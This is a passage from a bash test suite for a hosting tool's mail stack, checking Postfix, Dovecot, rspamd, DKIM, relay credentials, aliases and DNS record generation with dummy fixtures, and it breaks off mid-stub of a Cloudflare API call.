# fail2ban applies here too; repeating them would mean two places to keep in step
assert_lacks "the mail jails repeat no ignore list" "ignoreip" "$_j"

# the renderers are used as "renderer | lib_write_file": one that ends on a false test exits 1
for fn in lib_mail_render_postfix_master lib_mail_render_dovecot_auth lib_mail_render_sieve_spam \
          lib_mail_render_rspamd_worker_proxy lib_mail_render_rspamd_worker_normal \
          lib_mail_render_rspamd_worker_controller lib_mail_render_rspamd_options \
          lib_mail_render_rspamd_dropin \
          lib_mail_render_rspamd_redis lib_mail_render_rspamd_actions lib_mail_render_rspamd_ratelimit \
          lib_mail_render_redis_conf lib_mail_render_redis_unit lib_mail_render_unbound; do
  assert_eq "${fn} exits 0" 0 "$(run_isolated "$fn")"
done
assert_eq "lib_mail_render_postfix_main exits 0" 0 "$(run_isolated lib_mail_render_postfix_main mail.example.com hash ipv4)"
assert_eq "lib_mail_render_dovecot_local exits 0" 0 "$(run_isolated lib_mail_render_dovecot_local mail.example.com)"
assert_eq "lib_mail_render_jails exits 0" 0 "$(run_isolated lib_mail_render_jails)"
assert_eq "lib_mail_render_rspamd_classifier exits 0" 0 "$(run_isolated lib_mail_render_rspamd_classifier 0)"

assert_true  "a mail host is a name under a domain" lib_mail_hostname_valid "mail.example.com"
assert_false "a bare label is not one"              lib_mail_hostname_valid "localhost"
assert_false "and neither is an empty string"       lib_mail_hostname_valid ""
# a fresh VPS image calls itself something like srv1.localdomain, which looks like a name and
# can never receive a certificate or pass a recipient's HELO check
assert_true  "a real name can send mail"     lib_mail_name_usable "mail.example.com"
assert_false "the image's own name cannot"   lib_mail_name_usable "srv1.localdomain"
assert_false "nor a name reserved for tests" lib_mail_name_usable "mail.lomp.test"
assert_false "nor one on the local network"  lib_mail_name_usable "mail.home.lan"
# the WebAdmin may not take a port the mail server answers on
assert_eq "the WebAdmin cannot sit on the submission port" 1 "$(run_isolated lib_install_parse_args --admin-port 587 --skip-upgrade)"
assert_eq "nor on IMAPS" 1 "$(run_isolated lib_install_parse_args --admin-port 993 --skip-upgrade)"

# A relay password is given on stdin and ends up in exactly one file, which only root reads.
MAIL_POSTFIX_DIR="$TMP/pf"; MAIL_SASL_MAP="$TMP/pf/sasl_passwd"
MAIL_STATE_DIR="$TMP/mailstate"; MAIL_RELAY_INFO="$TMP/mailstate/relay.info"
mkdir -p "$MAIL_POSTFIX_DIR" "$MAIL_STATE_DIR"
( eval 'lib_mail_postmap() { return 0; }
        lib_mail_apply() { return 0; }
        lib_mail_host() { printf "mail.example.com"; }
        lib_manifest_set_json() { return 0; }'
  printf '%s\n' 'R3layS3cretPw' | lib_mail_relay_set smtp.example.net 2587 me@example.net ) >/dev/null 2>&1
assert_has "the credentials reach Postfix through its map" "[smtp.example.net]:2587 me@example.net:R3layS3cretPw" "$(cat "$MAIL_SASL_MAP")"
if (( CAN_CHMOD )); then assert_eq "which only root can read" "600" "$(stat -c %a "$MAIL_SASL_MAP")"; fi
assert_lacks "the state file holds no password" "R3layS3cretPw" "$(cat "$MAIL_RELAY_INFO")"
assert_has "only what is not secret" "USER=me@example.net" "$(cat "$MAIL_RELAY_INFO")"
assert_eq "a relay without a password is refused" 1 "$(printf '' | run_isolated lib_mail_relay_set smtp.example.net 587 me@example.net)"
# a user name with a space or a colon would split the entry and SASL would fail with nothing
# in the log to say why
assert_eq "a relay user with a space is refused" 1 "$(printf 'x\n' | run_isolated lib_mail_relay_set smtp.example.net 587 'me@example.net extra')"

# A rollback has to put the whole stack back, not the two services the apply happens to reach
# last: the apply stops at the FIRST failure, so the ones already restarted are the ones left
# running on files that have just been taken away from them.
_rb="$(declare -f _mail_apply_rollback)"
assert_has "the rollback restarts every mail service" "lib_mail_services" "$_rb"
assert_has "after telling systemd the unit files changed" "daemon-reload" "$_rb"
assert_has "and says which ones did not come back" "did not come back" "$_rb"
_ap="$(declare -f lib_mail_apply)"
assert_has "an apply that ends the run outright still restores" 'lib_rollback_push "lib_mail_restore_snapshot"' "$_ap"
assert_has "and the step is dropped once it succeeds" 'lib_rollback_drop "lib_mail_restore_snapshot"' "$_ap"
# the jail file is one of the managed files, so every path that writes it puts it into effect
assert_has "a changed jail file reaches fail2ban" "fail2ban-client reload" "$_ap"
assert_eq "and so is one with an invalid host" 1 "$(printf 'x\n' | run_isolated lib_mail_relay_set 'not a host' 587 me@example.net)"

# The stack can be dead for weeks without a word unless doctor knows about it.
_dm="$(declare -f _doc_check_mail)"
assert_true  "doctor has a mail section"            test -n "$_dm"
assert_has   "which runs only where mail exists"    "lib_mail_installed" "$_dm"
assert_has   "and checks every mail service"        "lib_mail_services" "$_dm"
assert_has   "that the Linux logins stay switched off" "auth-system" "$_dm"
assert_has   "the filter socket nobody else may open"  "MAIL_MILTER_GROUP" "$_dm"
assert_has   "and the certificate running out"      "lib_ssl_days_left" "$_dm"
assert_has   "doctor runs it"                       "_doc_check_mail" "$(declare -f lib_doctor_run)"

# =============================================================================
section "a domain of its own: mailboxes, aliases, DKIM"
# Two domains with mail and one without, so every renderer has to filter.
_m_state="$TMP/state/domains"
mkdir -p "$_m_state/alpha.example" "$_m_state/beta.example" "$_m_state/plain.example"
printf '{"domain":"alpha.example","mail":{"enabled":true,"selector":"lomp202609","quota_default":"2G"}}\n' >"$_m_state/alpha.example/domain.json"
printf '{"domain":"beta.example","mail":{"enabled":true,"selector":"lomp202510"}}\n' >"$_m_state/beta.example/domain.json"
printf '{"domain":"plain.example"}\n' >"$_m_state/plain.example/domain.json"
MAIL_PASSWD_FILE="$TMP/mail-passwd"
MAIL_ALIAS_DIR="$TMP/mail-aliases"; mkdir -p "$MAIL_ALIAS_DIR"
MAIL_DKIM_DIR="$TMP/dkim"; mkdir -p "$MAIL_DKIM_DIR"
MAIL_POSTFIX_DIR="$TMP/pf2"; MAIL_SNI_MAP="$TMP/pf2/sni"; mkdir -p "$MAIL_POSTFIX_DIR"
printf 'key\n' >"${MAIL_DKIM_DIR}/alpha.example.lomp202609.key"
printf 'key\n' >"${MAIL_DKIM_DIR}/beta.example.lomp202510.key"

assert_eq "only the domains whose mail is on" "alpha.example beta.example" "$(lib_mail_domains | tr '\n' ' ' | sed 's/ $//')"
assert_eq "each with the selector it was signed with" "lomp202510" "$(lib_mail_selector beta.example)"
assert_has "and a dated one where there is none yet" "lomp" "$(lib_mail_selector plain.example)"

lib_mail_passwd_set "info@alpha.example" '{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuv' "2G"
lib_mail_passwd_set "sales@alpha.example" '{BLF-CRYPT}$2y$05$second' "500M"
lib_mail_passwd_set "info@beta.example" '{BLF-CRYPT}$2y$05$third' "1G"
_pw="$(cat "$MAIL_PASSWD_FILE")"
# Dovecot keeps the FIRST line for a user and a line with too few fields authenticates but
# has no mailbox, so the shape is the whole point
assert_has "the line carries the hash and the quota" 'info@alpha.example:{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuv::::::userdb_quota_rule=*:storage=2G' "$_pw"
# fewer than eight fields authenticates but has no mailbox behind it
assert_true "with the eight fields Dovecot wants" bash -c "(( \$(awk -F: 'NR==1{print NF}' '$MAIL_PASSWD_FILE') >= 8 ))"
lib_mail_passwd_set "info@alpha.example" '{BLF-CRYPT}$2y$05$changed' "3G"
assert_eq  "a second password replaces the line, never adds one" 1 "$(grep -c '^info@alpha.example:' "$MAIL_PASSWD_FILE")"
assert_has "and the new one is what is left" '$2y$05$changed' "$(cat "$MAIL_PASSWD_FILE")"
assert_eq  "the quota comes back out" "3G" "$(lib_mail_box_quota info@alpha.example)"
assert_eq  "mailboxes of one domain" "info@alpha.example sales@alpha.example" "$(lib_mail_boxes alpha.example | sort | tr '\n' ' ' | sed 's/ $//')"

lib_mail_alias_set alpha.example "postmaster@alpha.example" "info@alpha.example"
lib_mail_alias_set alpha.example "team@alpha.example" "info@alpha.example,sales@alpha.example"
lib_mail_alias_set alpha.example "old@alpha.example" "somebody@outside.example"

_vd="$(lib_mail_render_vdomains)"
assert_has "a domain with mail is virtual" $'alpha.example\tvirtual' "$_vd"
assert_lacks "a site without mail is not" "plain.example" "$_vd"
_vm="$(lib_mail_render_vmailbox)"
assert_has "every mailbox is listed" $'info@alpha.example\talpha.example/info/Maildir/' "$_vm"
_va="$(lib_mail_render_valias)"
assert_has "aliases go in as written" $'team@alpha.example\tinfo@alpha.example,sales@alpha.example' "$_va"

_sn="$(lib_mail_render_senders)"
# postmap keeps the FIRST of two lines with the same key and only warns, so an address that is
# both a mailbox and an alias target must arrive on ONE line with both owners
assert_eq  "one line per address, never two" 1 "$(grep -c '^info@alpha.example' <<<"$_sn")"
assert_has "a mailbox may send as itself" $'info@alpha.example\tinfo@alpha.example' "$_sn"
assert_has "an alias may be used by everyone it points at" $'team@alpha.example\tinfo@alpha.example,sales@alpha.example' "$_sn"
assert_has "including postmaster" $'postmaster@alpha.example\tinfo@alpha.example' "$_sn"
assert_lacks "an alias that only goes outside gives nobody the right to send as it" "old@alpha.example" "$_sn"
# ...and it must not decide the exit status either. The renderer's loops end on the test that
# asks whether a target is local; with the last alias of the last domain pointing outside -
# "info@ goes to my Gmail", the most ordinary alias there is - that test is the last command
# of the brace group feeding the pipe, so under pipefail the whole write failed and took
# "mail enable" down with it. old@alpha.example above is exactly that alias.
( set -o pipefail; lib_mail_render_senders >/dev/null ); _sn_rc=$?
assert_eq "the renderer still succeeds" 0 "$_sn_rc"
( set -o pipefail; lib_mail_render_senders | cat >/dev/null ); _sn_rc=$?
assert_eq "and so does the pipeline that writes it" 0 "$_sn_rc"

# the certificate blocks only exist for names whose certificate is really on disk: a block
# pointing at a missing file is a silent failure Dovecot never reports
mkdir -p "${SSL_DEPLOY_DIR}/_mail_alpha_example"
printf 'x\n' >"${SSL_DEPLOY_DIR}/_mail_alpha_example/privkey.pem"
printf 'x\n' >"${SSL_DEPLOY_DIR}/_mail_alpha_example/fullchain.pem"
_sni="$(lib_mail_render_sni)"
assert_has "the private key is named first, or the handshake dies" $'mail.alpha.example\t'"${SSL_DEPLOY_DIR}/_mail_alpha_example/privkey.pem, ${SSL_DEPLOY_DIR}/_mail_alpha_example/fullchain.pem" "$_sni"
assert_lacks "a name with no certificate yet gets no line" "mail.beta.example" "$_sni"
_dsni="$(lib_mail_render_dovecot_sni)"
assert_has "Dovecot gets the same name" 'local_name "mail.alpha.example" {' "$_dsni"
assert_has "with the chain" "ssl_cert = <${SSL_DEPLOY_DIR}/_mail_alpha_example/fullchain.pem" "$_dsni"
assert_lacks "and nothing for a name without one" "mail.beta.example" "$_dsni"
assert_eq "the brace is the last thing on its line, or Dovecot refuses the file" 0 \
  "$(grep -c '{.*[^[:space:]]' <<<"$_dsni" || true)"

_sel="$(lib_mail_render_selectors)"
assert_has "a domain with a key gets a selector line" "alpha.example lomp202609" "$_sel"
rm -f "${MAIL_DKIM_DIR}/beta.example.lomp202510.key"
assert_lacks "one without a key does not" "beta.example" "$(lib_mail_render_selectors)"

# A password that cannot be hashed safely must be refused before it reaches doveadm: doveadm
# reads the password twice from stdin and, when the two reads differ, hashes the EMPTY
# password with a zero exit status.
assert_eq "an empty password is refused"        1 "$(run_isolated lib_mail_hash_password "")"
assert_eq "a short one is refused"              1 "$(run_isolated lib_mail_hash_password "abc")"
assert_eq "one with a line break is refused"    1 "$(run_isolated lib_mail_hash_password "$(printf 'a\nb')")"
assert_eq "one with a carriage return too"      1 "$(run_isolated lib_mail_hash_password "$(printf 'goodpassword\r')")"
assert_eq "and one past bcrypt's 72 bytes"      1 "$(run_isolated lib_mail_hash_password "$(printf 'a%.0s' {1..80})")"
_hp="$(declare -f lib_mail_hash_password)"
assert_has "the password is fed to doveadm twice" '%s\n%s\n' "$_hp"
# It used to hand the fresh hash back to "doveadm pw -t <hash>" to check it. That put the
# stored hash of a mailbox into the argument list of a root process, and /proc/<pid>/cmdline
# is world-readable on a machine whose every site is a Linux user - the exact leak the 0640
# mode of the password file exists to prevent. The shape of the hash is checked instead, and
# the password itself is put to Dovecot after the line is written, with only the address on
# the command line.
assert_lacks "the new hash is never an argument either" "doveadm pw -t" "$_hp"
assert_has   "a whole bcrypt hash is what comes back"   'BLF-CRYPT' "$_hp"
assert_has   "salt and digest, to their full length"    '{53}' "$_hp"
_pv="$(declare -f lib_mail_password_verify)"
assert_has "the check that replaces it asks Dovecot" "doveadm auth test" "$_pv"
assert_lacks "with no password on the command line"  '"$pw"' "$_pv"
_pc="$(declare -f _mail_pw_confirm)"
assert_has "and reads the password from a file, on stdin" 'lib_mail_password_verify "$a" < "$MAIL_PW_FILE"' "$_pc"
assert_has "which is removed either way"                  "_mail_pw_drop" "$_pc"
_ap="$(declare -f _mail_ask_password)"
assert_has "the file is 0600 from the moment it exists"   "chmod 0600" "$_ap"
assert_has "and goes on the cleanup list, for an interrupt" "LIB_EXTRA_CLEANUP" "$_ap"
_br="$(declare -f lib_mail_box_remove)"
assert_has "removing a mailbox takes the line away first" "awk -F: -v u=" "$_br"
assert_has "then waits for Dovecot to notice" "sleep 1" "$_br"
assert_has "then closes what is still open" "doveadm kick" "$_br"

_dns="$(_mail_dns_records alpha.example)"
assert_has "the mail name"        $'A\tmail.alpha.example' "$_dns"
assert_has "the MX record"        $'MX\talpha.example\t10 mail.alpha.example.' "$_dns"
assert_has "one SPF record"       "v=spf1 ip4:" "$_dns"
assert_has "the DKIM name"        "lomp202609._domainkey.alpha.example" "$_dns"
assert_has "a DMARC record that starts gently" "v=DMARC1; p=none;" "$_dns"
assert_has "and says what must never be proxied" "DNS only" "$_dns"
assert_eq  "every row has four fields" 0 "$(awk -F'\t' 'NF != 4' <<<"$_dns" | wc -l | tr -d ' ')"
assert_true "the JSON says the same" bash -c "jq -e '.records | length >= 5' <<<'$(lib_mail_dns_json alpha.example)' >/dev/null"
# the public half is read from the private key: generating it again would replace a key whose
# public half is already published, and every signature after that would fail
assert_has "the DKIM record comes from the key on disk" "openssl rsa" "$(declare -f lib_mail_dkim_public)"
assert_has "and a key is never overwritten" '[[ -s "$key" ]] && return 0' "$(declare -f lib_mail_dkim_ensure)"

# A mailbox line is a login that works from anywhere; the flag in domain.json is not what
# keeps anyone out. So what a removal takes away follows what is on disk.
MAIL_DISABLED_DIR="$TMP/mail-disabled"
assert_true  "a domain with mailboxes has traces" lib_mail_domain_has_traces alpha.example
assert_false "one that never had mail has none"   lib_mail_domain_has_traces nothing.example
_dis="$(declare -f lib_mail_disable_main)"
assert_has "turning mail off puts the logins beyond use" "lib_mail_boxes_park" "$_dis"
assert_has "and takes the certificate cron with it"      'lib_cron_remove "mail-cert:' "$_dis"
assert_has "the removal follows the traces, not the flag" "lib_mail_domain_has_traces" "$(declare -f lib_domain_remove_main)"
# parked lines keep their hash, so enabling the domain again asks nobody for a new password
lib_mail_boxes_park alpha.example
assert_false "a parked mailbox is out of the live store" lib_mail_box_exists "sales@alpha.example"
assert_true  "but it is not lost"                        test -s "${MAIL_DISABLED_DIR}/alpha.example.passwd"
lib_mail_boxes_unpark alpha.example
assert_true  "and comes back with the hash it had"       lib_mail_box_exists "sales@alpha.example"
assert_eq    "and its quota"                             "500M" "$(lib_mail_box_quota sales@alpha.example)"

# Removing the domain has to take the parked file too. It is not in the password file, so the
# loop over the live mailboxes never sees it - and it holds every hash the domain ever had,
# which "mail enable" merges straight back in. Hosting the same name for somebody else later
# would otherwise come up with the previous owner's logins working.
lib_mail_boxes_park alpha.example
assert_true  "a parked file is a trace of its own"   test -s "${MAIL_DISABLED_DIR}/alpha.example.passwd"
assert_true  "so a removal still runs for it"        lib_mail_domain_has_traces alpha.example
lib_mail_domain_purge alpha.example
assert_false "and the parked hashes go with the domain" test -s "${MAIL_DISABLED_DIR}/alpha.example.passwd"
assert_false "nothing of it is left"                    lib_mail_domain_has_traces alpha.example
assert_has  "the purge names the parked file"           'MAIL_DISABLED_DIR' "$(declare -f lib_mail_domain_purge)"

# The flag in domain.json goes down AFTER the logins are gone, not before: an interrupt in
# between used to leave a domain the state called off whose mailboxes still answered, and the
# guard at the top then refused to finish the job for good.
_dis_body="$(sed -n '/^lib_mail_disable_main()/,/^}/p' "$ROOT/lib/mail.sh")"
_dis_park_ln="$(grep -n 'lib_mail_boxes_park' <<<"$_dis_body" | head -1 | cut -d: -f1)"
_dis_flag_ln="$(grep -n 'mail.enabled = false' <<<"$_dis_body" | head -1 | cut -d: -f1)"
assert_true "the mailboxes are put aside before the flag is written" \
  test "${_dis_park_ln:-0}" -lt "${_dis_flag_ln:-0}"
assert_has "and 'already off' is only believed when the server agrees" 'lib_mail_boxes "$d"' "$_dis"
# a restore is authoritative about which mailboxes a domain has
_rs="$(declare -f lib_mail_restore_domain)"
assert_has "a restore clears the live lines first" "_mail_lines_drop" "$_rs"
assert_has "an archive taken with mail off goes back as it lies" 'form" == "plain"' "$_rs"
_bk="$(declare -f lib_mail_backup_domain)"
assert_has "and is taken that way in the first place" 'form="plain"' "$_bk"
assert_has "because doveadm has no user to copy through" 'parked > 0' "$_bk"
assert_has "the archive says which of the two it holds" "maildirs:" "$_bk"
_ld="$(declare -f _mail_lines_drop)"
assert_lacks "dropping the lines never touches the mail" "MAIL_VMAIL_HOME" "$_ld"

# an address is either a mailbox or an alias: Postfix resolves the alias first, so a mailbox
# of the same name would never see a message
_ba="$(declare -f lib_mail_box_add_main)"
assert_has "a mailbox may not be created over an alias" "is already an alias" "$_ba"
_bd="$(declare -f lib_mail_box_del_main)"
# in every domain's alias file, not only its own: sales@one.example may forward to
# info@two.example, and deleting that mailbox used to leave the alias accepting and bouncing
assert_has "deleting a mailbox repairs the aliases that pointed at it" "lib_mail_alias_forget_everywhere" "$_bd"
assert_has "wherever they live" 'MAIL_ALIAS_DIR' "$(declare -f lib_mail_alias_forget_everywhere)"
# turning a domain off deletes nothing, so those aliases are reported rather than removed
assert_has "and turning a domain off says which ones will bounce" "_mail_alias_targets_elsewhere" "$(declare -f lib_mail_disable_main)"
lib_mail_alias_set alpha.example "team@alpha.example" "info@alpha.example,sales@alpha.example"
lib_mail_alias_forget_target alpha.example "sales@alpha.example"
assert_has   "the target is taken out"     $'team@alpha.example\tinfo@alpha.example' "$(cat "$(lib_mail_alias_file alpha.example)")"
lib_mail_alias_forget_target alpha.example "info@alpha.example"
assert_lacks "and an alias with nowhere to go is removed" "team@alpha.example" "$(cat "$(lib_mail_alias_file alpha.example)")"

# the local part may not carry the recipient delimiter, or user+tag would stop reaching user
assert_false "no plus in a mailbox name"  lib_mail_local_valid "info+news"
assert_true  "the rest still passes"      lib_mail_local_valid "first.last-2"
# an address is compared, not matched: a dot is a dot
lib_mail_passwd_set "johnxdoe@alpha.example" '{BLF-CRYPT}$2y$05$x' "1G"
assert_false "a dot in an address is not a wildcard" lib_mail_box_exists "john.doe@alpha.example"

# the reason a password was refused has to survive the call that refused it
_ap="$(declare -f _mail_ask_password)"
assert_has "the password is read in this shell, not a subshell" "lib_mail_read_password >" "$_ap"
assert_has "and so is the hashing"                              "lib_mail_hash_password " "$_ap"

# a private address in an A or SPF record is a mail server nobody can deliver to
SYS_PUBLIC_IPV4="10.0.0.5"
assert_lacks "a NAT address is never printed as the server's" "10.0.0.5" "$(_mail_dns_records alpha.example)"
SYS_PUBLIC_IPV4="203.0.113.9"
assert_has   "a real one is" "203.0.113.9" "$(_mail_dns_records alpha.example)"
# where a relay carries the mail, its senders belong in SPF too
MAIL_RELAY_INFO="$TMP/mail-relay.info"
printf 'HOST=smtp.provider.example\nPORT=587\nUSER=u\nSPF_INCLUDE=spf.provider.example\n' >"$MAIL_RELAY_INFO"
assert_has "the relay is included in SPF" "include:spf.provider.example" "$(_mail_dns_records alpha.example)"
# ...and only the include the operator gave. It used to be guessed by dropping the first label
# of the relay's host name, which turns email-smtp.eu-west-1.amazonaws.com into
# eu-west-1.amazonaws.com - a name with no SPF record. An include whose target has no record is
# a permerror for the WHOLE record, so the guess threw away the ip4: term that would have
# passed and every message the domain sent failed SPF everywhere. "--host sendgrid.net" gave
# "include:net".
printf 'HOST=email-smtp.eu-west-1.amazonaws.com\nPORT=587\nUSER=u\n' >"$MAIL_RELAY_INFO"
_spfrec="$(_mail_dns_records alpha.example)"
assert_lacks "an unknown relay is never guessed at" "include:eu-west-1.amazonaws.com" "$_spfrec"
assert_lacks "nor any other include"                "include:" "$_spfrec"
assert_has   "the record still names this server"   "v=spf1 ip4:203.0.113.9 ~all" "$_spfrec"
printf 'HOST=sendgrid.net\nPORT=587\nUSER=u\n' >"$MAIL_RELAY_INFO"
assert_lacks "and a two-label host does not become include:net" "include:net" "$(_mail_dns_records alpha.example)"
rm -f "$MAIL_RELAY_INFO"

MAIL_PASSWD_FILE="$TMP/passwd"; MAIL_ALIAS_DIR="$TMP/aliases"; MAIL_DKIM_DIR="$TMP/dkim-unused"
rm -rf "$_m_state/alpha.example" "$_m_state/beta.example" "$_m_state/plain.example"

# =============================================================================
section "names, keys and aliases that outlive what made them"
# A selector that has been in DNS must never be handed to a second key: its record is gone but
# resolvers hold what they cached, and a signature under a known name made with a different key
# is one they refuse. The list of used names never got the FIRST one - the one every domain has.
assert_has "enabling a domain remembers the selector it starts with" "selectors_used" "$(declare -f lib_mail_enable_main)"
assert_has "and refuses to reuse one if the keys were deleted"       "_mail_selector_next" "$(declare -f lib_mail_enable_main)"
# ...which is why deleting the data has to drop the name as well, and keep the list
_pg2="$(declare -f lib_mail_domain_purge)"
assert_has   "deleting the data drops the selector"  "del(.mail.selector)" "$_pg2"
assert_lacks "but never the list of used names"      "del(.mail.selectors_used)" "$_pg2"
# a rotation that was under way when mail went off has to go on when it comes back
assert_has "enabling a domain again finishes an interrupted rotation" 'lib_cron_set "mail-dkim:' "$(declare -f lib_mail_enable_main)"
# running the same enable twice must not be a failure half-way through
assert_has "an existing mailbox is not an error on a second run" "is already there" "$(declare -f lib_mail_enable_main)"

# The signing keys used to live under /var/lib/rspamd, a directory the _rspamd user owns -
# and rspamd is the one component here that parses mail an attacker wrote. A symbolic link put
# there would have been followed by root's chmod, chown and every key written afterwards.
assert_lacks "the keys are not under rspamd's own directory" "/var/lib/rspamd/dkim" "$MAIL_DKIM_DIR"
_de="$(declare -f lib_mail_dirs_ensure)"
assert_has "and a link where they go is refused, not repaired" 'is a symbolic link' "$_de"
assert_has "an older server's keys are moved across"           "_mail_dkim_dir_migrate" "$_de"
assert_has "only the ones not there already"                   '[[ -e "${MAIL_DKIM_DIR}/${b}" ]] && continue' "$(declare -f _mail_dkim_dir_migrate)"

# =============================================================================
section "the check has to agree with the writing"
# Two A records at a mail name send about half of all inbound SMTP to whichever address is
# wrong. The writing side calls that a conflict and refuses; the check called it "ok", because
# it only asked whether the right address appeared somewhere in the answer - which also said
# yes to 85.9.13.2 when the server is 5.9.13.2.
# Asked of the function itself, with DNS answering whatever the case under test needs.
_dnsq_answer=""
eval 'dig() { printf "%s" "$_dig_out"; }'
eval '_mail_dns_query() {
  case "$1 $2" in
    "A mail.alpha.example") printf "%s" "$_dnsq_a" ;;
    "MX alpha.example")     printf "10 mail.alpha.example.\n" ;;
    TXT*)                   printf "%s" "$_dnsq_txt" ;;
    *)                      printf "" ;;
  esac
}'
SYS_PUBLIC_IPV4="203.0.113.9"
_dnsq_txt=""
_dnsq_a="203.0.113.9"
_out_one="$(lib_mail_dns_check alpha.example 2>&1 || true)"
_dnsq_a=$'203.0.113.9\n198.51.100.7'
_out_two="$(lib_mail_dns_check alpha.example 2>&1 || true)"
_dnsq_a="85.9.13.2"; SYS_PUBLIC_IPV4="5.9.13.2"
_out_sub="$(lib_mail_dns_check alpha.example 2>&1 || true)"
assert_lacks "one right address draws no complaint"          "mail.alpha.example" "$(grep -E 'more than one|says:' <<<"$_out_one" || true)"
assert_has   "a second address at a mail name is reported"   "answers more than one address" "$_out_two"
assert_has   "an address that merely contains the right one is reported too" "says: 85.9.13.2" "$_out_sub"
unset -f dig _mail_dns_query
SYS_PUBLIC_IPV4="203.0.113.9"

# =============================================================================
section "records lompstack wrote, and can still take back"
# What lompstack published is worked out from the state, so anything removed from the state
# first can never be named again. Both of these used to leave a record in the zone for good.
_wd="$(declare -f lib_webmail_domain_disable)"
_wd_rec_ln="$(grep -n '_wm_dns_record_remove' <<<"$_wd" | head -1 | cut -d: -f1)"
_wd_flag_ln="$(grep -n 'del(.mail.webmail)' <<<"$_wd" | head -1 | cut -d: -f1)"
assert_true "webmail.<domain> is removed before the flag that names it" \
  test "${_wd_rec_ln:-0}" -lt "${_wd_flag_ln:-0}"
_rt="$(declare -f lib_mail_dkim_retire_old)"
_rt_rec_ln="$(grep -n '_mail_dkim_dns_remove' <<<"$_rt" | head -1 | cut -d: -f1)"
_rt_st_ln="$(grep -n 'del(.mail.selector_old)' <<<"$_rt" | head -1 | cut -d: -f1)"
assert_true "and a retired DKIM record before the selector that names it" \
  test "${_rt_rec_ln:-0}" -lt "${_rt_st_ln:-0}"
assert_has "a rotation given up takes its record with it" "_mail_dkim_dns_remove" "$(declare -f _mail_dkim_cmd)"
# and only ever lompstack's own records: somebody may be pointing that name somewhere on purpose
for _fn in _wm_dns_record_remove _mail_dkim_dns_remove; do
  assert_has "${_fn} removes only what lompstack wrote" 'CF_RECORD_TAG' "$(declare -f "$_fn")"
  assert_has "${_fn} says so when the zone cannot be read" "still published" "$(declare -f "$_fn")"
done
# a zone that cannot be looked up is not a zone with nothing in it
assert_has "the cleanup says when it removed nothing" "are still published" "$(declare -f lib_mail_dns_cleanup)"
# --replace-mx writes records and deletes another provider's MX, so it takes the lock like --apply
assert_has "--replace-mx takes the global lock too" '*" --replace-mx "*' "$(sed -n '/^  case "\$cmd" in/,/^  esac/p' "$ROOT/setup.sh")"
# changing the relay changes every domain's SPF record, and nothing here writes DNS by itself
for _fn in lib_mail_relay_set lib_mail_relay_off; do
  assert_has "${_fn} says which domains need their records again" "_mail_relay_dns_note" "$(declare -f "$_fn")"
done
# and the credentials outlive a failed apply, or Postfix comes back naming a file that is gone
_ro="$(declare -f lib_mail_relay_off)"
_ro_apply_ln="$(grep -n 'lib_mail_apply' <<<"$_ro" | head -1 | cut -d: -f1)"
_ro_sasl_ln="$(grep -n 'lib_rm "\$MAIL_SASL_MAP"' <<<"$_ro" | head -1 | cut -d: -f1)"
assert_true "the credential map is removed only after the apply succeeded" \
  test "${_ro_apply_ln:-0}" -lt "${_ro_sasl_ln:-0}"

# =============================================================================
section "what an older server is missing, and what notices"
# A webmail's virtual host names its certificate only if the files were there when it was
# written. One switched on before its name resolved here got none, and the six-hourly job that
# finally obtained the certificate rewrote Postfix's and Dovecot's tables but not that file -
# so the browser got the listener's own certificate for the life of the certificate, while
# status and doctor, which look at the certificate and not at the virtual host, said "fine".
_ce="$(declare -f lib_mail_domain_cert_ensure)"
assert_eq  "the virtual host is rewritten on both paths to a certificate" 2 "$(grep -c '_mail_webmail_vhost_refresh' <<<"$_ce")"
_vr="$(declare -f _mail_webmail_vhost_refresh)"
assert_has "only where there is a webmail" ".mail.webmail" "$_vr"
assert_has "and it writes the virtual host"  "lib_webmail_vhost_apply" "$_vr"

# The webmail sends through 127.0.0.1:10587 and saves its filters over 4190. Both came with the
# webmail; a server installed before it and then self-updated still has the older release's
# master.cf and Dovecot configuration, because self-update reconfigures nothing on purpose.
# Switching a webmail on there gave one that read mail and could not send a single message.
_sc="$(declare -f _wm_mail_stack_current)"
assert_has "the webmail checks the server can carry it" "10587" "$_sc"
assert_has "filters too"                                "managesieve-login" "$_sc"
assert_has "and brings the configuration up to date"    "lib_mail_apply" "$_sc"
assert_has "before anything else is done for the domain" "_wm_mail_stack_current" "$(declare -f lib_webmail_domain_enable)"
# and doctor says so on a server nobody switches a webmail on again
assert_has "doctor fails when the ports a webmail needs answer nobody" \
  'there is a webmail but nothing listens on' "$(declare -f _doc_check_mail)"

# The certbot deploy hook was only ever written by the installer. After a self-update the old
# copy stayed: it reloads Postfix and Dovecot but does not restart OpenLiteSpeed, which holds
# the certificate it started with - so browsers were handed the expired one from day 90 while
# doctor read the deployed files and called it healthy.
assert_has "applying the mail configuration rewrites the deploy hook" "lib_ssl_hook_install" "$(declare -f lib_mail_apply)"
assert_has "and doctor knows an older hook when it sees one" '_wm_' "$(declare -f _doc_check_ssl_infra)"

# =============================================================================
section "every mail command is in 'mail help'"
# Four subcommands were added over three phases and none of them reached the help text, so
# "lomp mail" told an operator about eleven of the fifteen commands it actually has. The help
# is the only place these are written down, which makes an undocumented command an invisible
# one.
_mail_case="$(awk '/^lib_mail_main\(\)/{f=1} f{print} f && /^[}]/{exit}' "$ROOT/lib/mail.sh")"
_mail_subs="$(grep -oE '^[[:space:]]+[a-z]+(\|[a-z]+)*\)' <<<"$_mail_case" | tr -d ' )' | cut -d'|' -f1 | grep -vE '^(\*|help|--help|-h)$' | sort -u | tr '\n' ' ')"
_mail_help="$(lib_mail_usage)"
assert_true "the mail dispatcher was found" test -n "$_mail_subs"
for _sub in $_mail_subs; do
  assert_true "'mail ${_sub}' is documented" grep -qE "^  ${_sub}( |$)" <<<"$_mail_help"
done
# and the ones this release added, by name, so a renamed command is caught too
assert_has "webmail on|off|status"  "webmail on|off|status <domain>" "$_mail_help"
assert_has "dkim rotate"            "dkim rotate <domain>" "$_mail_help"
assert_has "backup and restore"     "restore <domain> [--file ARCHIVE]" "$_mail_help"

# =============================================================================
section "writing the records into Cloudflare"
# Every API call goes through _cf_api, so the whole of this can be exercised without an
# account: the stub answers like Cloudflare and records what it was asked to do.
CF_CALLS="$TMP/cf-calls.txt"
CF_ZONE_CACHE=()
: >"$CF_CALLS"
_cf_api_real="$(declare -f _cf_api)"   # put back afterwards: later sections use the real one
_cf_zone_json='{"success":true,"result":[{"id":"zone123"}]}'
eval '_cf_api() {
  printf "%s %s\n" "$1" "$2" >>"$CF_CALLS"
  case "$1 $2" in
